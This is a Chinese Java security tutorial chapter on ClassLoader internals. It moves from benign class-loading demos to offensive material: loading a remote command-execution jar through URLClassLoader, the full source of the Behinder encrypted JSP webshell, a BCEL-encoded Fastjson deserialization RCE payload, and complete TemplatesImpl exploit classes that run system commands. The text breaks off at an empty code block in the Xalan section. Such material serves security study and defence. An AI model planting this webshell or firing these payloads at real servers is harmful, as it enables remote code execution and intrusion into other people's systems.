# ClassLoader（类加载机制）

Java是一个依赖于`JVM`（Java虚拟机）实现的跨平台的开发语言。Java程序在运行前需要先编译成`class文件`，Java类初始化的时候会调用`java.lang.ClassLoader`加载类字节码，`ClassLoader`会调用JVM的native方法（`defineClass0/1/2`）来定义一个`java.lang.Class`实例。

**JVM架构图：**

![img](https://oss.javasec.org/images/JvmSpec7.png)



## Java类

Java是编译型语言，我们编写的java文件需要编译成后class文件后才能够被JVM运行，学习`ClassLoader`之前我们先简单了解下Java类。

**示例TestHelloWorld.java：**

```java
package com.anbai.sec.classloader;

/**
 * Creator: yz
 * Date: 2019/12/17
 */
public class TestHelloWorld {

    public String hello() {
        return "Hello World~";
    }

}
```

编译`TestHelloWorld.java`：`javac TestHelloWorld.java`

我们可以通过JDK自带的`javap`命令反汇编`TestHelloWorld.class`文件对应的`com.anbai.sec.classloader.TestHelloWorld`类，以及使用Linux自带的`hexdump`命令查看`TestHelloWorld.class`文件二进制内容：

![img](https://oss.javasec.org/images/image-20191217171821663.png)

JVM在执行`TestHelloWorld`之前会先解析class二进制内容，JVM执行的其实就是如上`javap`命令生成的字节码。



## ClassLoader

一切的Java类都必须经过JVM加载后才能运行，而`ClassLoader`的主要作用就是Java类文件的加载。在JVM类加载器中最顶层的是`Bootstrap ClassLoader（引导类加载器）`、`Extension ClassLoader（扩展类加载器）`、`App ClassLoader（系统类加载器）`，`AppClassLoader`是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用`AppClassLoader`加载类，`ClassLoader.getSystemClassLoader()`返回的系统类加载器也是`AppClassLoader`。

值得注意的是某些时候我们获取一个类的类加载器时候可能会返回一个`null`值，如:`java.io.File.class.getClassLoader()`将返回一个`null`对象，因为`java.io.File`类在JVM初始化的时候会被`Bootstrap ClassLoader（引导类加载器）`加载（该类加载器实现于JVM层，采用C++编写），我们在尝试获取被`Bootstrap ClassLoader`类加载器所加载的类的`ClassLoader`时候都会返回`null`。

`ClassLoader`类有如下核心方法：

1. `loadClass`（加载指定的Java类）
2. `findClass`（查找指定的Java类）
3. `findLoadedClass`（查找JVM已经加载过的类）
4. `defineClass`（定义一个Java类）
5. `resolveClass`（链接指定的Java类）



## Java类动态加载方式

Java类加载方式分为`显式`和`隐式`,`显式`即我们通常使用`Java反射`或者`ClassLoader`来动态加载一个类对象，而`隐式`指的是`类名.方法名()`或`new `类实例。`显式`类加载方式也可以理解为类动态加载，我们可以自定义类加载器去加载任意的类。

**常用的类动态加载方式：**

```java
// 反射加载TestHelloWorld示例
Class.forName("com.anbai.sec.classloader.TestHelloWorld");

// ClassLoader加载TestHelloWorld示例
this.getClass().getClassLoader().loadClass("com.anbai.sec.classloader.TestHelloWorld");
```

`Class.forName("类名")`默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用`Class.forName("类名", 是否初始化类, 类加载器)`，而`ClassLoader.loadClass`默认不会初始化类方法。



## ClassLoader类加载流程

理解Java类加载机制并非易事，这里我们以一个Java的HelloWorld来学习`ClassLoader`。

`ClassLoader`加载`com.anbai.sec.classloader.TestHelloWorld`类`loadClass`重要流程如下：

1. `ClassLoader`会调用`public Class<?> loadClass(String name)`方法加载`com.anbai.sec.classloader.TestHelloWorld`类。
2. 调用`findLoadedClass`方法检查`TestHelloWorld`类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。
3. 如果创建当前`ClassLoader`时传入了父类加载器（`new ClassLoader(父类加载器)`）就使用父类加载器加载`TestHelloWorld`类，否则使用JVM的`Bootstrap ClassLoader`加载。
4. 如果上一步无法加载`TestHelloWorld`类，那么调用自身的`findClass`方法尝试加载`TestHelloWorld`类。
5. 如果当前的`ClassLoader`没有重写了`findClass`方法，那么直接返回类加载失败异常。如果当前类重写了`findClass`方法并通过传入的`com.anbai.sec.classloader.TestHelloWorld`类名找到了对应的类字节码，那么应该调用`defineClass`方法去JVM中注册该类。
6. 如果调用loadClass的时候传入的`resolve`参数为true，那么还需要调用`resolveClass`方法链接类，默认为false。
7. 返回一个被JVM加载后的`java.lang.Class`类对象。



**示例 - ClassLoader#loadClass：**

![20230612144647](https://oss.javasec.org/images/20230612144647.png)



## 自定义ClassLoader

`java.lang.ClassLoader`是所有的类加载器的父类，`java.lang.ClassLoader`有非常多的子类加载器，比如我们用于加载jar包的`java.net.URLClassLoader`其本身通过继承`java.lang.ClassLoader`类，重写了`findClass`方法从而实现了加载目录class文件甚至是远程资源文件。

既然已知ClassLoader具备了加载类的能力，那么我们不妨尝试下写一个自己的类加载器来实现加载自定义的字节码（这里以加载`TestHelloWorld`类为例）并调用`hello`方法。

如果`com.anbai.sec.classloader.TestHelloWorld`类存在的情况下，我们可以使用如下代码即可实现调用`hello`方法并输出：

```java
TestHelloWorld t = new TestHelloWorld();
        String str = t.hello();
        System.out.println(str);
```

但是如果`com.anbai.sec.classloader.TestHelloWorld`根本就不存在于我们的`classpath`，那么我们可以使用自定义类加载器重写`findClass`方法，然后在调用`defineClass`方法的时候传入`TestHelloWorld`类的字节码的方式来向JVM中定义一个`TestHelloWorld`类，最后通过反射机制就可以调用`TestHelloWorld`类的`hello`方法了。

**TestClassLoader示例代码：**

```java
package com.anbai.sec.classloader;

import java.lang.reflect.Method;

/**
 * Creator: yz
 * Date: 2019/12/17
 */
public class TestClassLoader extends ClassLoader {

    // TestHelloWorld类名
    private static String testClassName = "com.anbai.sec.classloader.TestHelloWorld";

    // TestHelloWorld类字节码
    private static byte[] testClassBytes = new byte[]{
            -54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0,
            16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,
            101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101,
            1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108,
            97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99,
            101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111,
            114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111,
            32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47,
            115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115,
            116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108,
            97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1,
            0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0,
            1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1,
            0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11,
            0, 0, 0, 2, 0, 12
    };

    @Override
    public Class<?> findClass(String name) throws ClassNotFoundException {
        // 只处理TestHelloWorld类
        if (name.equals(testClassName)) {
            // 调用JVM的native方法定义TestHelloWorld类
            return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);
        }

        return super.findClass(name);
    }

    public static void main(String[] args) {
        // 创建自定义的类加载器
        TestClassLoader loader = new TestClassLoader();

        try {
            // 使用自定义的类加载器加载TestHelloWorld类
            Class testClass = loader.loadClass(testClassName);

            // 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();
            Object testInstance = testClass.newInstance();

            // 反射获取hello方法
            Method method = testInstance.getClass().getMethod("hello");

            // 反射调用hello方法,等价于 String str = t.hello();
            String str = (String) method.invoke(testInstance);

            System.out.println(str);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
```

利用自定义类加载器我们可以在webshell中实现加载并调用自己编译的类对象，比如本地命令执行漏洞调用自定义类字节码的native方法绕过RASP检测，也可以用于加密重要的Java类字节码（只能算弱加密了）。



## URLClassLoader

`URLClassLoader`继承了`ClassLoader`，`URLClassLoader`提供了加载远程资源的能力，在写漏洞利用的`payload`或者`webshell`的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。

**TestURLClassLoader.java示例：**

```java
package com.anbai.sec.classloader;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;

/**
 * Creator: yz
 * Date: 2019/12/18
 */
public class TestURLClassLoader {

    public static void main(String[] args) {
        try {
            // 定义远程加载的jar路径
            URL url = new URL("https://anbai.io/tools/cmd.jar");

            // 创建URLClassLoader对象，并加载远程jar包
            URLClassLoader ucl = new URLClassLoader(new URL[]{url});

            // 定义需要执行的系统命令
            String cmd = "ls";

            // 通过URLClassLoader加载远程jar包中的CMD类
            Class cmdClass = ucl.loadClass("CMD");

            // 调用CMD类中的exec方法，等价于: Process process = CMD.exec("whoami");
            Process process = (Process) cmdClass.getMethod("exec", String.class).invoke(null, cmd);

            // 获取命令执行结果的输入流
            InputStream           in   = process.getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[]                b    = new byte[1024];
            int                   a    = -1;

            // 读取命令执行结果
            while ((a = in.read(b)) != -1) {
                baos.write(b, 0, a);
            }

            // 输出命令执行结果
            System.out.println(baos.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
```

远程的`cmd.jar`中就一个`CMD.class`文件，对应的编译之前的代码片段如下：

```cmd
import java.io.IOException;

/**
 * Creator: yz
 * Date: 2019/12/18
 */
public class CMD {

    public static Process exec(String cmd) throws IOException {
        return Runtime.getRuntime().exec(cmd);
    }

}
```

程序执行结果如下：

```java
README.md
        gitbook
        javaweb-sec-source
        javaweb-sec.iml
        jni
        pom.xml
```



## 类加载隔离

创建类加载器的时候可以指定该类加载的父类加载器，ClassLoader是有隔离机制的，不同的ClassLoader可以加载相同的Class（两者必须是非继承关系），同级ClassLoader跨类加载器调用方法时必须使用反射。

![img](https://oss.javasec.org/images/202110251829223.png)



### 跨类加载器加载

RASP和IAST经常会用到跨类加载器加载类的情况，因为RASP/IAST会在任意可能存在安全风险的类中插入检测代码，因此必须得保证RASP/IAST的类能够被插入的类所使用的类加载正确加载，否则就会出现ClassNotFoundException，除此之外，跨类加载器调用类方法时需要特别注意一个基本原则：`ClassLoader A和ClassLoader B可以加载相同类名的类，但是ClassLoader A中的Class A和ClassLoader B中的Class A是完全不同的对象，两者之间调用只能通过反射`。

**示例 - 跨类加载器加载：**

```java
package com.anbai.sec.classloader;

import java.lang.reflect.Method;

import static com.anbai.sec.classloader.TestClassLoader.TEST_CLASS_BYTES;
import static com.anbai.sec.classloader.TestClassLoader.TEST_CLASS_NAME;

public class TestCrossClassLoader {

    public static class ClassLoaderA extends ClassLoader {

        public ClassLoaderA(ClassLoader parent) {
            super(parent);
        }

        {
            // 加载类字节码
            defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);
        }

    }

    public static class ClassLoaderB extends ClassLoader {

        public ClassLoaderB(ClassLoader parent) {
            super(parent);
        }

        {
            // 加载类字节码
            defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);
        }

    }

    public static void main(String[] args) throws Exception {
        // 父类加载器
        ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader();

        // A类加载器
        ClassLoaderA aClassLoader = new ClassLoaderA(parentClassLoader);

        // B类加载器
        ClassLoaderB bClassLoader = new ClassLoaderB(parentClassLoader);

        // 使用A/B类加载器加载同一个类
        Class<?> aClass  = Class.forName(TEST_CLASS_NAME, true, aClassLoader);
        Class<?> aaClass = Class.forName(TEST_CLASS_NAME, true, aClassLoader);
        Class<?> bClass  = Class.forName(TEST_CLASS_NAME, true, bClassLoader);

        // 比较A类加载和B类加载器加载的类是否相等
        System.out.println("aClass == aaClass：" + (aClass == aaClass));
        System.out.println("aClass == bClass：" + (aClass == bClass));

        System.out.println("\n" + aClass.getName() + "方法清单：");

        // 获取该类所有方法
        Method[] methods = aClass.getDeclaredMethods();

        for (Method method : methods) {
            System.out.println(method);
        }

        // 创建类实例
        Object instanceA = aClass.newInstance();

        // 获取hello方法
        Method helloMethod = aClass.getMethod("hello");

        // 调用hello方法
        String result = (String) helloMethod.invoke(instanceA);

        System.out.println("\n反射调用：" + TEST_CLASS_NAME + "类" + helloMethod.getName() + "方法，返回结果：" + result);
    }

}
```

程序执行后输出如下结果：

```java
aClass == aaClass：true
        aClass == bClass：false

        com.anbai.sec.classloader.TestHelloWorld方法清单：
public java.lang.String com.anbai.sec.classloader.TestHelloWorld.hello()

        反射调用：com.anbai.sec.classloader.TestHelloWorld类hello方法，返回结果：Hello World~
```



## JSP自定义类加载后门

以`冰蝎`为首的JSP后门利用的就是自定义类加载实现的，冰蝎的客户端会将待执行的命令或代码片段通过动态编译成类字节码并加密后传到冰蝎的JSP后门，后门会经过AES解密得到一个随机类名的类字节码，然后调用自定义的类加载器加载，最终通过该类重写的`equals`方法实现恶意攻击，其中`equals`方法传入的`pageContext`对象是为了便于获取到请求和响应对象，需要注意的是冰蝎的命令执行等参数不会从请求中获取，而是直接插入到了类成员变量中。

**示例 - 冰蝎JSP后门：**

```jsp
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
    class U extends ClassLoader {

        U(ClassLoader c) {
            super(c);
        }

        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
%>
<%
    if (request.getMethod().equals("POST")) {
        String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
        session.putValue("u", k);
        Cipher c = Cipher.getInstance("AES");
        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
    }
%>
```

**示例 - 冰蝎命令执行类反编译：**

![img](https://oss.javasec.org/images/202110251849324.png)



## BCEL ClassLoader

[BCEL](https://commons.apache.org/proper/commons-bcel/)（`Apache Commons BCEL™`）是一个用于分析、创建和操纵Java类文件的工具库，Oracle JDK引用了BCEL库，不过修改了原包名`org.apache.bcel.util.ClassLoader`为`com.sun.org.apache.bcel.internal.util.ClassLoader`，BCEL的类加载器在解析类名时会对ClassName中有`$$BCEL$$`标识的类做特殊处理，该特性经常被用于编写各类攻击Payload。



### BCEL攻击原理

当BCEL的`com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass`加载一个类名中带有`$$BCEL$$`的类时会截取出`$$BCEL$$`后面的字符串，然后使用`com.sun.org.apache.bcel.internal.classfile.Utility#decode`将字符串解析成类字节码（带有攻击代码的恶意类），最后会调用`defineClass`注册解码后的类，一旦该类被加载就会触发类中的恶意代码，正是因为BCEL有了这个特性，才得以被广泛的应用于各类攻击Payload中。

**示例 - BCEL类名解码：**

![img](https://oss.javasec.org/images/202110251829177.png)



### BCEL编解码

**BCEL编码：**

```java
private static final byte[] CLASS_BYTES = new byte[]{类字节码byte数组}];

// BCEL编码类字节码
        String className = "$$BCEL$$" + com.sun.org.apache.bcel.internal.classfile.Utility.encode(CLASS_BYTES, true);
```

编码后的类名：`$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85S$dbn$d......`，BCEL会对类字节码进行编码，

**BCEL解码：**

```java
int    index    = className.indexOf("$$BCEL$$");
        String realName = className.substring(index + 8);

// BCEL解码类字节码
        byte[] bytes = com.sun.org.apache.bcel.internal.classfile.Utility.decode(realName, true);
```

如果被加载的类名中包含了`$$BCEL$$`关键字，BCEL就会使用特殊的方式进行解码并加载解码之后的类。



### BCEL兼容性问题

BCEL这个特性仅适用于BCEL 6.0以下，因为从6.0开始`org.apache.bcel.classfile.ConstantUtf8#setBytes`就已经过时了，如下：

```java
/**
 * @param bytes the raw bytes of this Utf-8
 * @deprecated (since 6.0)
 */
@java.lang.Deprecated
public final void setBytes( final String bytes ) {
        throw new UnsupportedOperationException();
        }
```

Oracle自带的BCEL是修改了原始的包名，因此也有兼容性问题，已知支持该特性的JDK版本为：`JDK1.5 - 1.7`、`JDK8 - JDK8u241`、`JDK9`。



### BCEL FastJson攻击链分析

Fastjson（1.1.15 - 1.2.4）可以使用其中有个dbcp的Payload就是利用了BCEL攻击链，利用代码如下：

```json
{"@type":"org.apache.commons.dbcp.BasicDataSource","driverClassName":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85R$5bO$TA$U$fe$a6$z$dde$bbXX$$$e2$F$z$8aPJ$e9r$x$X$r$3e$d8$60$a2$U1$b6$b1$89o$d3$e9$a4$ynw$9b$dd$a9$c2$l1$f1$X$f0$cc$L$S$l$fc$B$fe$p$l4$9e$5d$h$U$rqvsf$ce7$e7$7c$e7$9b$99$f3$f5$c7$e7$_$AV$b0i$m$8b$9b$3an$e9$b8m$60$Kwt$dc5$90$c3$b4$8e$7b$3a$ee$eb$981$f0$A$b3$91$99$d3$907$60b$5eCA$c3$CCz$db$f1$i$f5$98$n$99$9f$7f$cd$90$aa$f8$z$c9$90$ad$3a$9e$7c$d1$eb4eP$e7M$97$Q$7d$5b$b8$fd$c8$a1$9a$e2$e2$ed$k$ef$c6$5b$g$8a$c4$c9$60$d4$fc$5e$m$e4S$t$8a$b6$ea2TO$w$3b$d5$8a$cb$c3$b0t$c8$dfq$T$c3$Ya$98$f0$bb$d2$cb$z$f2$5c$85$bb$a2$e7r$e5$H$r$de$ed2h$7eX$f2x$87$f8$WM$94$60$T$d2p$bc$96$ff$3e$a4$K$s$96$b0L$c9$82$92r$cb$x$abk$e5$f5$8d$cd$ad$a5$fe$8aa$80$f4$f6$8e$Y$c6D$_ps$aeOq$H$7e$a8$kn$d1$b05$ac$98X$c5$9a$892$d6$ZF$p5$b6$e3$db$cf$f6w$8e$84$ec$w$c7$f7LlD$e2$e6$84$df$b1$b9$d7$e4$8e$jJa$8bH$bc$eb$f3$96$M$ecK$Hb$Y$8eI$5c$ee$b5$ed$fd$e6$a1$U$ea$STS$81$e3$b5$_C$c7$a1$92$j$86L$5b$aa$97$B$5dB$a0$8e$Zf$f3$d5$bf$b3$k$cd$ff$L$d1$ed$86$8a$H$wl8$ea$80a$fc$aa$ac7$M$p$bf$d1W$3dO9$jz$J$83$ea$5d8$e3$f9$3f$c9$fb0$b1$a7$e4$91$Ut$fc$ff$a8$n$ddB$86$n$rd$bb$b4$a9$e2$3e$a8$H$5cHL$e3$g$f5$604$S$60$d1K$93$b5$c8$9b$a2$99$d1$3cP$f8$EvJ$L$ba$7f$b2$e9_$mt$8c$5d$84$7e$a0$d4$q$cde$x$b1k$r$cf$91$aa$$X$DgH$7f$c4$a0$a5$ed$9e$m$bb$60$e9$b1$9b$b6$Gw$cfa$U$ce$90i$9c$40$df$x$9ea$e8$94HfP$84M$bd$9d$88K$94$90$n$ab$T$e5$m$7d$Z$wab$SC$b1$d2$Z$f2$8a$Y$a7$e8Qj$ac1$aca$82$3c$90$97$fa$8eI$N$T$f4g$9ek$b8$fe$N$v$o$9e$8c$8fu$e3$t$b2$b7e$b6p$D$A$A","driverClassLoader":{"@type":"org.apache.bcel.util.ClassLoader"}}
```

FastJson自动调用setter方法修改`org.apache.commons.dbcp.BasicDataSource`类的`driverClassName`和`driverClassLoader`值，`driverClassName`是经过BCEL编码后的`com.anbai.sec.classloader.TestBCELClass`类字节码，`driverClassLoader`是一个由FastJson创建的`org.apache.bcel.util.ClassLoader`实例。

**示例 - com.anbai.sec.classloader.TestBCELClass类：**

```java
package com.anbai.sec.classloader;

import java.io.IOException;

public class TestBCELClass {

    static {
        String command = "open -a Calculator.app";
        String osName  = System.getProperty("os.name");

        if (osName.startsWith("Windows")) {
            command = "calc 12345678901234567";
        } else if (osName.startsWith("Linux")) {
            command = "curl localhost:9999/";
        }

        try {
            Runtime.getRuntime().exec(command);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
```

使用BCEL编码com.anbai.sec.classloader.TestBCELClass类字节码：

```java
/**
 * 将一个Class文件编码成BCEL类
 *
 * @param classFile Class文件路径
 * @return 编码后的BCEL类
 * @throws IOException 文件读取异常
 */
public static String bcelEncode(File classFile) throws IOException {
        return "$$BCEL$$" + Utility.encode(FileUtils.readFileToByteArray(classFile), true);
        }
```

从JSON反序列化实现来看，只是注入了类名和类加载器并不足以触发类加载，导致命令执行的关键问题就在于FastJson会自动调用getter方法，`org.apache.commons.dbcp.BasicDataSource`本没有`connection`成员变量，但有一个`getConnection()`方法，按理来讲应该不会调用`getConnection()`方法，但是FastJson会通过`getConnection()`这个方法名计算出一个名为`connection`的field，详情参见：[com.alibaba.fastjson.util.TypeUtils#computeGetters](https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/util/TypeUtils.java#L1904)，因此FastJson最终还是调用了`getConnection()`方法。

当`getConnection()`方法被调用时就会使用注入进来的`org.apache.bcel.util.ClassLoader`类加载器加载注入进来恶意类字节码，如下图：

![img](https://oss.javasec.org/images/202110251829173.png)

因为使用了反射的方式加载`com.anbai.sec.classloader.TestBCELClass`类，而且还特意指定了需要初始化类（`Class.forName(driverClassName, true, driverClassLoader);`），因此该类的静态语句块（`static{...}`）将会被执行，完整的攻击示例代码如下：

```java
package com.anbai.sec.classloader;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import org.apache.commons.dbcp.BasicDataSource;
import org.javaweb.utils.FileUtils;

import java.io.File;
import java.io.IOException;
import java.util.LinkedHashMap;
import java.util.Map;

public class BCELClassLoader {

    /**
     * com.anbai.sec.classloader.TestBCELClass类字节码，Windows和MacOS弹计算器，Linux执行curl localhost:9999
     * </pre>
     */
    private static final byte[] CLASS_BYTES = new byte[]{
            -54, -2, -70, -66, 0, 0, 0, 50, 0, // .... 因字节码过长此处省略，完整代码请参考：https://github.com/javaweb-sec/javaweb-sec/blob/master/javaweb-sec-source/javase/src/main/java/com/anbai/sec/classloader/BCELClassLoader.java
    };

    /**
     * 将一个Class文件编码成BCEL类
     *
     * @param classFile Class文件路径
     * @return 编码后的BCEL类
     * @throws IOException 文件读取异常
     */
    public static String bcelEncode(File classFile) throws IOException {
        return "$$BCEL$$" + Utility.encode(FileUtils.readFileToByteArray(classFile), true);
    }

    /**
     * BCEL命令执行示例，测试时请注意兼容性问题：① 适用于BCEL 6.0以下。② JDK版本为：JDK1.5 - 1.7、JDK8 - JDK8u241、JDK9
     *
     * @throws Exception 类加载异常
     */
    public static void bcelTest() throws Exception {
        // 使用反射是为了防止高版本JDK不存在com.sun.org.apache.bcel.internal.util.ClassLoader类
//      Class<?> bcelClass = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");

        // 创建BCEL类加载器
//          ClassLoader classLoader = (ClassLoader) bcelClass.newInstance();
//          ClassLoader classLoader = new com.sun.org.apache.bcel.internal.util.ClassLoader();
        ClassLoader classLoader = new org.apache.bcel.util.ClassLoader();

        // BCEL编码类字节码
        String className = "$$BCEL$$" + Utility.encode(CLASS_BYTES, true);

        System.out.println(className);

        Class<?> clazz = Class.forName(className, true, classLoader);

        System.out.println(clazz);
    }

    /**
     * Fastjson 1.1.15 - 1.2.4 反序列化RCE示例，示例程序考虑到测试环境的兼容性，采用的都是Apache commons dbcp和bcel
     *
     * @throws IOException BCEL编码异常
     */
    public static void fastjsonRCE() throws IOException {
        // BCEL编码类字节码
        String className = "$$BCEL$$" + Utility.encode(CLASS_BYTES, true);

        // 构建恶意的JSON
        Map<String, Object> dataMap        = new LinkedHashMap<String, Object>();
        Map<String, Object> classLoaderMap = new LinkedHashMap<String, Object>();

        dataMap.put("@type", BasicDataSource.class.getName());
        dataMap.put("driverClassName", className);

        classLoaderMap.put("@type", org.apache.bcel.util.ClassLoader.class.getName());
        dataMap.put("driverClassLoader", classLoaderMap);

        String json = JSON.toJSONString(dataMap);
        System.out.println(json);

        JSONObject jsonObject = JSON.parseObject(json);
        System.out.println(jsonObject);
    }

    public static void main(String[] args) throws Exception {
//      bcelTest();
        fastjsonRCE();
    }

}
```



## Xalan ClassLoader

Xalan和BCEL一样都经常被用于编写反序列化Payload，Oracle JDK默认也引用了Xalan，同时修改了原包名`org.apache.xalan.xsltc.trax.TemplatesImpl`为`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，Xalan最大的特点是可以传入类字节码并初始化（需要调用`getOutputProperties`方法），从而实现RCE，比如Fastjson和Jackson会使用反射调用`getter/setter`或`成员变量映射`的方式实现JSON反序列化。

`TemplatesImpl`中有一个`_bytecodes`成员变量，用于存储类字节码，通过JSON反序列化的方式可以修改该变量值，但因为该成员变量没有可映射的get/set方法所以需要修改JSON库的虚拟化配置，比如Fastjson解析时必须启用`Feature.SupportNonPublicField`、Jackson必须开启`JacksonPolymorphicDeserialization`（调用`mapper.enableDefaultTyping()`），所以利用条件相对较高。

**TemplatesImpl类：**

![img](https://oss.javasec.org/images/202110251829988.png)

**Xalan攻击示例代码：**

```java
package com.anbai.sec.classloader;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Properties;

import static org.apache.commons.codec.binary.Base64.encodeBase64String;

public class XalanTemplatesImpl {

    /**
     * com.anbai.sec.classloader.TestAbstractTranslet类字节码
     */
    public static final byte[] CLASS_BYTES = new byte[]{
            -54, -2, -70, -66 // .... 因字节码过长此处省略，完整代码请参考：https://github.com/javaweb-sec/javaweb-sec/blob/master/javaweb-sec-source/javase/src/main/java/com/anbai/sec/classloader/XalanTemplatesImpl.java
    };

    /**
     * 使用反射修改TemplatesImpl类的成员变量方式触发命令执行，Jackson和Fastjson采用这种方式触发RCE
     *
     * @throws Exception 调用异常
     */
    public static void invokeField() throws Exception {
        TemplatesImpl template      = new TemplatesImpl();
        Class<?>      templateClass = template.getClass();

        // 获取需要修改的成员变量
        Field byteCodesField        = templateClass.getDeclaredField("_bytecodes");
        Field nameField             = templateClass.getDeclaredField("_name");
        Field tFactoryField         = templateClass.getDeclaredField("_tfactory");
        Field outputPropertiesField = templateClass.getDeclaredField("_outputProperties");

        // 修改成员属性访问权限
        byteCodesField.setAccessible(true);
        nameField.setAccessible(true);
        tFactoryField.setAccessible(true);
        outputPropertiesField.setAccessible(true);

        // 设置类字节码
        byteCodesField.set(template, new byte[][]{CLASS_BYTES});

        // 设置名称
        nameField.set(template, "");

        // 设置TransformerFactoryImpl实例
        tFactoryField.set(template, new TransformerFactoryImpl());

        // 设置Properties配置
        outputPropertiesField.set(template, new Properties());

        // 触发defineClass调用链：
        //   getOutputProperties->newTransformer->getTransletInstance->defineTransletClasses->defineClass
        // 触发命令执行调用链：
        //   getOutputProperties->newTransformer->getTransletInstance->new TestAbstractTranslet->Runtime#exec
        template.getOutputProperties();
    }

    /**
     * 使用反射调用TemplatesImpl类的私有构造方法方式触发命令执行
     *
     * @throws Exception 调用异常
     */
    public static void invokeConstructor() throws Exception {
        // 获取TemplatesImpl构造方法
        Constructor<TemplatesImpl> constructor = TemplatesImpl.class.getDeclaredConstructor(
                byte[][].class, String.class, Properties.class, int.class, TransformerFactoryImpl.class
        );

        // 修改访问权限
        constructor.setAccessible(true);

        // 创建TemplatesImpl实例
        TemplatesImpl template = constructor.newInstance(
                new byte[][]{CLASS_BYTES}, "", new Properties(), -1, new TransformerFactoryImpl()
        );

        template.getOutputProperties();
    }

    /**
     * Fastjson 1.2.2 - 1.2.4反序列化RCE示例
     */
    public static void fastjsonRCE() {
        // 构建恶意的JSON
        Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
        dataMap.put("@type", TemplatesImpl.class.getName());
        dataMap.put("_bytecodes", new String[]{encodeBase64String(CLASS_BYTES)});
        dataMap.put("_name", "");
        dataMap.put("_tfactory", new Object());
        dataMap.put("_outputProperties", new Object());

        // 生成Payload
        String json = JSON.toJSONString(dataMap);
        System.out.println(json);

        // 使用FastJson反序列化，但必须启用SupportNonPublicField特性
        JSON.parseObject(json, Object.class, new ParserConfig(), Feature.SupportNonPublicField);
    }

    public static void main(String[] args) throws Exception {
//      invokeField();
//      invokeConstructor();
        fastjsonRCE();
    }

}
```

在MacOS和Windows上执行示例程序后会弹出计算器，Linux会执行`curl localhost:9999`。



### Xalan FastJson攻击链分析

为了深入学习Xalan攻击链，这里我们以Fastjson为例分析其攻击原理，Fastjson（1.2.2 - 1.2.4）在启用了`SupportNonPublicField`特性时可以利用Xalan的TemplatesImpl实现RCE，具体的利用代码如下：

```json
